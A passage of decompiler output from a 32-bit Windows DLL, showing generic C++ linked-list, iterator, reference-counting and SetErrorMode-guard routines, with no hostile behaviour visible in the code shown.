  return sub_10015203(this - 2);
}

//----- (100152E1) --------------------------------------------------------
char sub_100152E1()
{
  return sub_100152D6();
}

//----- (100152E9) --------------------------------------------------------
int __thiscall sub_100152E9(_DWORD *this, int a2, int a3)
{
  return sub_10015207(this - 2, a2, a3);
}

//----- (100152F1) --------------------------------------------------------
void *__thiscall sub_100152F1(char *this, char a2)
{
  return sub_10014F97(this - 8, a2);
}

//----- (100152F9) --------------------------------------------------------
_DWORD *__stdcall sub_100152F9(_DWORD *a1)
{
  sub_10015379(a1);
  sub_10015345((int)a1);
  return a1;
}

//----- (10015325) --------------------------------------------------------
void __stdcall sub_10015325(_DWORD *a1)
{
  sub_100153B0(a1);
}

//----- (10015345) --------------------------------------------------------
void __usercall sub_10015345(int a1@<esi>)
{
  int v1; // eax
  _DWORD v2[7]; // [esp+10h] [ebp-20h] BYREF
  int v3; // [esp+2Ch] [ebp-4h]

  sub_100281D7(v2);
  v3 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)a1 + 56))(a1, v1);
  v3 = -1;
  sub_100153B0(v2);
}
// 10015364: variable 'v1' is possibly undefined
// 10015345: using guessed type _DWORD var_20[7];

//----- (10015379) --------------------------------------------------------
_DWORD *__stdcall sub_10015379(_DWORD *a1)
{
  sub_10015909(a1);
  *a1 = &off_100739D8;
  a1[1] = 0;
  a1[2] = 0;
  a1[3] = 0;
  return a1;
}
// 100739D8: using guessed type int (__thiscall *off_100739D8)(void *Block, char);

//----- (100153B0) --------------------------------------------------------
void __thiscall sub_100153B0(_DWORD *this)
{
  _DWORD *i; // eax
  _DWORD *v3; // edi

  *this = &off_100739D8;
  for ( i = (_DWORD *)this[1]; i; i = v3 )
  {
    v3 = (_DWORD *)i[4];
    sub_10015813(i);
  }
  sub_1001558D(this);
}
// 100739D8: using guessed type int (__thiscall *off_100739D8)(void *Block, char);

//----- (10015407) --------------------------------------------------------
void *__thiscall sub_10015407(void *this, int a2)
{
  sub_100158AD(a2, (int)this);
  return this;
}

//----- (1001541C) --------------------------------------------------------
void *__thiscall sub_1001541C(void *this, int a2)
{
  sub_100158AD(a2, (int)this);
  return this;
}

//----- (10015431) --------------------------------------------------------
int __thiscall sub_10015431(_DWORD *this)
{
  return this[3];
}

//----- (10015435) --------------------------------------------------------
_DWORD *__thiscall sub_10015435(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_10015978(this, v3, this[1], 0);
  else
    v4 = 0;
  sub_10015DFF(a2, (int)v4);
  return a2;
}

//----- (1001548B) --------------------------------------------------------
_DWORD *__thiscall sub_1001548B(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_10015B62(this, v3, this[1], 0);
  else
    v4 = 0;
  sub_10015E83(a2, (int)v4);
  return a2;
}

//----- (100154E1) --------------------------------------------------------
_DWORD *__thiscall sub_100154E1(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_10015978(this, v3, 0, this[2]);
  else
    v4 = 0;
  sub_10015DFF(a2, (int)v4);
  return a2;
}

//----- (10015537) --------------------------------------------------------
_DWORD *__thiscall sub_10015537(int *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0x10u);
  if ( v3 )
    v4 = sub_10015B62(this, v3, 0, this[2]);
  else
    v4 = 0;
  sub_10015E83(a2, (int)v4);
  return a2;
}

//----- (1001558D) --------------------------------------------------------
void __thiscall sub_1001558D(_DWORD *this)
{
  *this = &off_10073A18;
  *this = off_10072944;
}
// 10072944: using guessed type int (__thiscall *off_10072944[2])(void *Block, char);
// 10073A18: using guessed type int (__thiscall *off_10073A18)(void *Block, char);

//----- (100155B2) --------------------------------------------------------
int *__thiscall sub_100155B2(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_10015939(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 10015608: variable 'v5' is possibly undefined

//----- (1001561A) --------------------------------------------------------
int *__thiscall sub_1001561A(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_100100F8(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 10015670: variable 'v5' is possibly undefined

//----- (10015682) --------------------------------------------------------
void __thiscall sub_10015682(void *this, int a2)
{
  int v2[4]; // [esp+10h] [ebp-14h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_10015E3E(v2);
}

//----- (100156BA) --------------------------------------------------------
void __thiscall sub_100156BA(void *this, int a2, int a3)
{
  int v3[4]; // [esp+10h] [ebp-14h] BYREF
  int v4; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_10015E3E(v3);
}

//----- (100156F5) --------------------------------------------------------
void __thiscall sub_100156F5(void *this, int a2)
{
  int v2[4]; // [esp+10h] [ebp-14h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_10015E3E(v2);
}

//----- (1001572D) --------------------------------------------------------
int __thiscall sub_1001572D(void *this, int a2)
{
  int v2; // esi
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 24))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10011A2D(v4);
  return v2;
}

//----- (10015769) --------------------------------------------------------
int __thiscall sub_10015769(void *this, int a2)
{
  int v2; // esi
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10015E3E(v4);
  return v2;
}

//----- (100157A5) --------------------------------------------------------
void __thiscall sub_100157A5(void *this)
{
  int v1[4]; // [esp+10h] [ebp-14h] BYREF
  int v2; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v1[0] + 4))(v1[0]) )
    (*(void (__thiscall **)(int))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_10015E3E(v1);
}

//----- (100157F4) --------------------------------------------------------
_DWORD *__thiscall sub_100157F4(_DWORD *Block, char a2)
{
  sub_100153B0(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10015813) --------------------------------------------------------
void *__stdcall sub_10015813(void *Block)
{
  sub_1001588D((int)Block);
  j__free(Block);
  return Block;
}

//----- (1001582E) --------------------------------------------------------
_DWORD *__thiscall sub_1001582E(_DWORD *Block, char a2)
{
  sub_1001558D(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001584D) --------------------------------------------------------
_DWORD *__thiscall sub_1001584D(_DWORD *Block, char a2)
{
  *Block = &off_10073A50;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10073A50: using guessed type int (__thiscall *off_10073A50)(void *Block, char);

//----- (1001586D) --------------------------------------------------------
_DWORD *__thiscall sub_1001586D(_DWORD *Block, char a2)
{
  *Block = &off_10073A70;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10073A70: using guessed type int (__thiscall *off_10073A70)(void *Block, char);

//----- (1001588D) --------------------------------------------------------
void __stdcall sub_1001588D(int a1)
{
  sub_100100D0(a1);
}

//----- (100158AD) --------------------------------------------------------
void __usercall sub_100158AD(int a1@<ecx>, int a2@<edi>)
{
  int v3; // eax
  int v4; // ecx
  int v5[5]; // [esp+10h] [ebp-18h] BYREF
  int v6; // [esp+24h] [ebp-4h]

  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 52))(a2);
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)a1 + 8))(a1, v5);
  v6 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v5[0] + 4))(v5[0]) )
  {
    v3 = (*(int (__thiscall **)(int))(*(_DWORD *)v5[0] + 12))(v5[0]);
    (*(void (__thiscall **)(int, int))(*(_DWORD *)a2 + 36))(a2, v3);
    sub_100100F8(v4, v5[0]);
  }
  v6 = -1;
  sub_10011A2D(v5);
}
// 100158E6: variable 'v4' is possibly undefined

//----- (10015909) --------------------------------------------------------
_DWORD *__stdcall sub_10015909(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10072944;
  *a1 = &off_10073A18;
  return result;
}
// 10072944: using guessed type int (__thiscall *off_10072944[2])(void *Block, char);
// 10073A18: using guessed type int (__thiscall *off_10073A18)(void *Block, char);

//----- (10015939) --------------------------------------------------------
int __usercall sub_10015939@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (10015978) --------------------------------------------------------
_DWORD *__thiscall sub_10015978(void *this, _DWORD *a2, int a3, int a4)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10073A50;
  a2[1] = this;
  a2[2] = a4;
  *a2 = &off_10073A90;
  a2[3] = a3;
  return result;
}
// 10073A50: using guessed type int (__thiscall *off_10073A50)(void *Block, char);
// 10073A90: using guessed type int (__thiscall *off_10073A90)(void *Block, char);

//----- (100159B2) --------------------------------------------------------
void __thiscall sub_100159B2(_DWORD *this)
{
  *this = &off_10073A90;
  *this = &off_10073A50;
}
// 10073A50: using guessed type int (__thiscall *off_10073A50)(void *Block, char);
// 10073A90: using guessed type int (__thiscall *off_10073A90)(void *Block, char);

//----- (100159D7) --------------------------------------------------------
BOOL __thiscall sub_100159D7(_DWORD *this)
{
  return this[3] == 0;
}

//----- (100159E0) --------------------------------------------------------
BOOL __thiscall sub_100159E0(_DWORD *this)
{
  return this[2] != 0;
}

//----- (100159E9) --------------------------------------------------------
int __thiscall sub_100159E9(_DWORD *this)
{
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  result = this[3];
  if ( !result )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (10015A0D) --------------------------------------------------------
int __thiscall sub_10015A0D(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[3];
  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[2] = v1;
  result = *(_DWORD *)(v1 + 16);
  this[3] = result;
  return result;
}

//----- (10015A3A) --------------------------------------------------------
int __thiscall sub_10015A3A(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[3] = v1;
  result = *(_DWORD *)(v1 + 20);
  this[2] = result;
  return result;
}

//----- (10015A67) --------------------------------------------------------
void *__thiscall sub_10015A67(int this)
{
  int v2; // eax
  int v3; // edi
  int v4; // eax
  int v5; // eax
  int v6; // eax
  void *result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 12);
  if ( !v2 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v3 = *(_DWORD *)(v2 + 16);
  v4 = *(_DWORD *)(this + 8);
  if ( v4 )
    *(_DWORD *)(v4 + 16) = v3;
  if ( v3 )
    *(_DWORD *)(v3 + 20) = *(_DWORD *)(this + 8);
  v5 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v5 + 4) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v5 + 4) = v3;
  v6 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v6 + 8) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v6 + 8) = *(_DWORD *)(this + 8);
  result = *(void **)(this + 12);
  if ( result )
    result = sub_10015813(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = v3;
  --*(_DWORD *)(*(_DWORD *)(this + 4) + 12);
  return result;
}

//----- (10015ADD) --------------------------------------------------------
_DWORD *__thiscall sub_10015ADD(_DWORD *this, _DWORD *a2)
{
  _DWORD *result; // eax
  int v4; // ecx
  int v5; // ecx
  int v6[4]; // [esp-18h] [ebp-3Ch] BYREF
  int v7; // [esp-8h] [ebp-2Ch]
  int v8; // [esp-4h] [ebp-28h]
  int *v9; // [esp+10h] [ebp-14h]
  void *Block; // [esp+14h] [ebp-10h]
  int v11; // [esp+20h] [ebp-4h]

  ++*(_DWORD *)(this[1] + 12);
  Block = operator new(0x18u);
  v11 = 0;
  if ( Block )
  {
    v8 = this[2];
    v7 = this[3];
    v9 = v6;
    sub_10010099(v6, a2);
    LOBYTE(v11) = 0;
    result = sub_10015D9F(Block, v6[0], v6[1], v6[2], v6[3], v7, v8);
  }
  else
  {
    result = 0;
  }
  v11 = -1;
  v4 = this[2];
  if ( v4 )
    *(_DWORD *)(v4 + 16) = result;
  else
    *(_DWORD *)(this[1] + 4) = result;
  v5 = this[3];
  this[2] = result;
  if ( v5 )
    *(_DWORD *)(v5 + 20) = result;
  else
    *(_DWORD *)(this[1] + 8) = result;
  return result;
}

//----- (10015B62) --------------------------------------------------------
_DWORD *__thiscall sub_10015B62(void *this, _DWORD *a2, int a3, int a4)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10073A70;
  a2[1] = this;
  a2[2] = a4;
  *a2 = &off_10073AB0;
  a2[3] = a3;
  return result;
}
// 10073A70: using guessed type int (__thiscall *off_10073A70)(void *Block, char);
// 10073AB0: using guessed type int (__thiscall *off_10073AB0)(void *Block, char);

//----- (10015B9C) --------------------------------------------------------
void __thiscall sub_10015B9C(_DWORD *this)
{
  *this = &off_10073AB0;
  *this = &off_10073A70;
}
// 10073A70: using guessed type int (__thiscall *off_10073A70)(void *Block, char);
// 10073AB0: using guessed type int (__thiscall *off_10073AB0)(void *Block, char);

//----- (10015BC1) --------------------------------------------------------
BOOL __thiscall sub_10015BC1(_DWORD *this)
{
  return this[3] == 0;
}

//----- (10015BCA) --------------------------------------------------------
BOOL __thiscall sub_10015BCA(_DWORD *this)
{
  return this[2] != 0;
}

//----- (10015BD3) --------------------------------------------------------
int __thiscall sub_10015BD3(_DWORD *this)
{
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  result = this[3];
  if ( !result )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (10015BF7) --------------------------------------------------------
int __thiscall sub_10015BF7(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[3];
  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[2] = v1;
  result = *(_DWORD *)(v1 + 16);
  this[3] = result;
  return result;
}

//----- (10015C24) --------------------------------------------------------
int __thiscall sub_10015C24(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[3] = v1;
  result = *(_DWORD *)(v1 + 20);
  this[2] = result;
  return result;
}

//----- (10015C51) --------------------------------------------------------
void *__thiscall sub_10015C51(int this)
{
  int v2; // eax
  int v3; // edi
  int v4; // eax
  int v5; // eax
  int v6; // eax
  void *result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 12);
  if ( !v2 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v3 = *(_DWORD *)(v2 + 16);
  v4 = *(_DWORD *)(this + 8);
  if ( v4 )
    *(_DWORD *)(v4 + 16) = v3;
  if ( v3 )
    *(_DWORD *)(v3 + 20) = *(_DWORD *)(this + 8);
  v5 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v5 + 4) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v5 + 4) = v3;
  v6 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v6 + 8) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v6 + 8) = *(_DWORD *)(this + 8);
  result = *(void **)(this + 12);
  if ( result )
    result = sub_10015813(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = v3;
  --*(_DWORD *)(*(_DWORD *)(this + 4) + 12);
  return result;
}

//----- (10015CC7) --------------------------------------------------------
_DWORD *__thiscall sub_10015CC7(_DWORD *this, _DWORD *a2)
{
  _DWORD *result; // eax
  int v4; // ecx
  int v5; // ecx
  int v6[4]; // [esp-18h] [ebp-3Ch] BYREF
  int v7; // [esp-8h] [ebp-2Ch]
  int v8; // [esp-4h] [ebp-28h]
  int *v9; // [esp+10h] [ebp-14h]
  void *Block; // [esp+14h] [ebp-10h]
  int v11; // [esp+20h] [ebp-4h]

  ++*(_DWORD *)(this[1] + 12);
  Block = operator new(0x18u);
  v11 = 0;
  if ( Block )
  {
    v8 = this[2];
    v7 = this[3];
    v9 = v6;
    sub_10010099(v6, a2);
    LOBYTE(v11) = 0;
    result = sub_10015D9F(Block, v6[0], v6[1], v6[2], v6[3], v7, v8);
  }
  else
  {
    result = 0;
  }
  v11 = -1;
  v4 = this[2];
  if ( v4 )
    *(_DWORD *)(v4 + 16) = result;
  else
    *(_DWORD *)(this[1] + 4) = result;
  v5 = this[3];
  this[2] = result;
  if ( v5 )
    *(_DWORD *)(v5 + 20) = result;
  else
    *(_DWORD *)(this[1] + 8) = result;
  return result;
}

//----- (10015D4C) --------------------------------------------------------
_DWORD *__thiscall sub_10015D4C(_DWORD *Block, char a2)
{
  sub_100159B2(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10015D6B) --------------------------------------------------------
_DWORD *__thiscall sub_10015D6B(_DWORD *Block, char a2)
{
  sub_10015B9C(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10015D9F) --------------------------------------------------------
_DWORD *__stdcall sub_10015D9F(_DWORD *a1, int a2, int a3, int a4, int a5, int a6, int a7)
{
  sub_10010099(a1, &a2);
  a1[4] = a6;
  a1[5] = a7;
  sub_100100D0((int)&a2);
  return a1;
}

//----- (10015DFF) --------------------------------------------------------
_DWORD *__userpurge sub_10015DFF@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (10015E3E) --------------------------------------------------------
void __thiscall sub_10015E3E(void *this)
{
  sub_10015ED4((int)this);
}

//----- (10015E83) --------------------------------------------------------
_DWORD *__userpurge sub_10015E83@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (10015ED4) --------------------------------------------------------
void __usercall sub_10015ED4(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10015F22) --------------------------------------------------------
_DWORD *__stdcall sub_10015F22(_DWORD *a1, int a2, int a3)
{
  *a1 = &off_10072BE8;
  *a1 = &off_10073AD0;
  sub_10009F32(a1 + 1, a2);
  a1[3] = a3;
  return a1;
}
// 10072BE8: using guessed type int (__thiscall *off_10072BE8)(void *Block, char);
// 10073AD0: using guessed type int (__thiscall *off_10073AD0)(void *Block, char);

//----- (10015F65) --------------------------------------------------------
int *__thiscall sub_10015F65(int *Block, char a2)
{
  sub_10015F84(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10015F84) --------------------------------------------------------
void __thiscall sub_10015F84(int *this)
{
  *this = (int)&off_10073AD0;
  sub_10009F65(this + 1);
  *this = (int)&off_10072BE8;
}
// 10072BE8: using guessed type int (__thiscall *off_10072BE8)(void *Block, char);
// 10073AD0: using guessed type int (__thiscall *off_10073AD0)(void *Block, char);

//----- (10015FB7) --------------------------------------------------------
char __thiscall sub_10015FB7(_DWORD **this)
{
  _DWORD *v2; // eax
  _DWORD *v3; // eax
  bool v4; // bl
  int v5; // ecx
  char v6; // bl
  int v8[2]; // [esp+14h] [ebp-30h] BYREF
  int v9[2]; // [esp+1Ch] [ebp-28h] BYREF
  _DWORD v10[5]; // [esp+24h] [ebp-20h] BYREF
  int v11; // [esp+40h] [ebp-4h]

  (*(void (__thiscall **)(_DWORD *, int *))(*this[3] + 8))(this[3], v8);
  v11 = 0;
  if ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v8[0] + 4))(v8[0]) )
  {
LABEL_4:
    v6 = 0;
  }
  else
  {
    while ( 1 )
    {
      v2 = (_DWORD *)(*(int (__thiscall **)(int))(*(_DWORD *)v8[0] + 12))(v8[0]);
      sub_10010099(v10, v2);
      LOBYTE(v11) = 1;
      v3 = sub_100281A2((int)v10, v9);
      LOBYTE(v11) = 2;
      v4 = sub_1000A959((int)v3, (int)(this + 1));
      LOBYTE(v11) = 1;
      sub_10009F65(v9);
      if ( v4 )
        break;
      sub_100100F8(v5, v8[0]);
      LOBYTE(v11) = 0;
      sub_100100D0((int)v10);
      if ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v8[0] + 4))(v8[0]) )
        goto LABEL_4;
    }
    LOBYTE(v11) = 0;
    sub_100100D0((int)v10);
    v6 = 1;
  }
  v11 = -1;
  sub_10011A2D(v8);
  return v6;
}
// 10016053: variable 'v5' is possibly undefined
// 10015FB7: using guessed type _DWORD var_20[5];

//----- (100160AB) --------------------------------------------------------
_DWORD *__usercall sub_100160AB@<eax>(_DWORD *a1@<esi>)
{
  *a1 = &off_10073AD8;
  a1[1] = SetErrorMode(0x8001u);
  return a1;
}
// 10073AD8: using guessed type int (__thiscall *off_10073AD8)(void *Block, char);

//----- (100160C2) --------------------------------------------------------
_DWORD *__thiscall sub_100160C2(_DWORD *Block, char a2)
{
  sub_100160E1(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100160E1) --------------------------------------------------------
UINT __thiscall sub_100160E1(_DWORD *this)
{
  *this = &off_10073AD8;
  return SetErrorMode(this[1]);
}
// 10073AD8: using guessed type int (__thiscall *off_10073AD8)(void *Block, char);

//----- (10016114) --------------------------------------------------------
_DWORD *__stdcall sub_10016114(_DWORD *a1, int a2)
{
  sub_10016305(a1);
  *a1 = &off_10073AE0;
  a1[4] = a2;
  return a1;
}
// 10073AE0: using guessed type int (__thiscall *off_10073AE0)(void *Block, char);

//----- (10016147) --------------------------------------------------------
_DWORD *__thiscall sub_10016147(_DWORD *Block, char a2)
{
  sub_10016166(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10016166) --------------------------------------------------------
void __thiscall sub_10016166(_DWORD *this)
{
  *this = &off_10073AE0;
  sub_1001633C(this);
}
// 10073AE0: using guessed type int (__thiscall *off_10073AE0)(void *Block, char);

//----- (1001618A) --------------------------------------------------------
int __stdcall sub_1001618A(int *a1)
{
  int v1; // esi
  int v3[6]; // [esp+10h] [ebp-1Ch] BYREF
  int v4; // [esp+28h] [ebp-4h]

  sub_100115F1(v3);
  v4 = 0;
  sub_10016222(a1, 0, (int)v3);
  if ( (*(int (__thiscall **)(int *))(v3[0] + 4))(v3) )
    v1 = *(_DWORD *)(*(int (__thiscall **)(int *, _DWORD))(v3[0] + 44))(v3, 0);
  else
    v1 = -1;
  v4 = -1;
  sub_10011668((int)v3);
  return v1;
}

//----- (100161E5) --------------------------------------------------------
_DWORD *__stdcall sub_100161E5(int *a1, _DWORD *a2)
{
  sub_100115F1(a2);
  sub_10016222(a1, 1, (int)a2);
  return a2;
}

//----- (10016222) --------------------------------------------------------
void __thiscall sub_10016222(int *this, char a2, int a3)
{
  int v4; // eax
  int v5; // esi
  int v6; // ecx
  int v7[2]; // [esp+18h] [ebp-20h] BYREF
  int v8; // [esp+20h] [ebp-18h] BYREF
  char v9; // [esp+27h] [ebp-11h]
  int v10; // [esp+34h] [ebp-4h]

  (*(void (__thiscall **)(int))(*(_DWORD *)a3 + 52))(a3);
  sub_10015345(this[4]);
  v8 = 0;
  (*(void (__thiscall **)(int *, int *))(*this + 12))(this, v7);
  v10 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v7[0] + 4))(v7[0]) )
  {
    v4 = (*(int (__thiscall **)(int))(*(_DWORD *)v7[0] + 12))(v7[0]);
    v5 = *(_DWORD *)v4;
    InterlockedIncrement(*(volatile LONG **)(v4 + 4));
    v9 = 0;
    LOBYTE(v10) = 2;
    if ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v5 + 4))(v5) == 1 )
      v9 = 1;
    v10 = 1;
    if ( v9 )
    {
      (*(void (__thiscall **)(int, int *))(*(_DWORD *)a3 + 36))(a3, &v8);
      if ( !a2 )
      {
        LOBYTE(v10) = 0;
        sub_10003DA1();
        break;
      }
    }
    sub_10016746(v6, v7[0]);
    ++v8;
    LOBYTE(v10) = 0;
    sub_10003DA1();
  }
  v10 = -1;
  sub_10003DDA(v7);
}
// 100162EC: variable 'v6' is possibly undefined
// 10016222: using guessed type int var_18;

//----- (10016305) --------------------------------------------------------
_DWORD *__stdcall sub_10016305(_DWORD *a1)
{
  sub_10016893(a1);
  *a1 = &off_10073B20;
  a1[1] = 0;
  a1[2] = 0;
  a1[3] = 0;
  return a1;
}
// 10073B20: using guessed type int (__thiscall *off_10073B20)(void *Block, char);

//----- (1001633C) --------------------------------------------------------
void __thiscall sub_1001633C(_DWORD *this)
{
  _DWORD *i; // eax
  _DWORD *v3; // edi

  *this = &off_10073B20;
  for ( i = (_DWORD *)this[1]; i; i = v3 )
  {
    v3 = (_DWORD *)i[2];
    sub_1001679D(i);
  }
  sub_10016519(this);
}
// 10073B20: using guessed type int (__thiscall *off_10073B20)(void *Block, char);

//----- (10016393) --------------------------------------------------------
void *__thiscall sub_10016393(void *this, int a2)
{
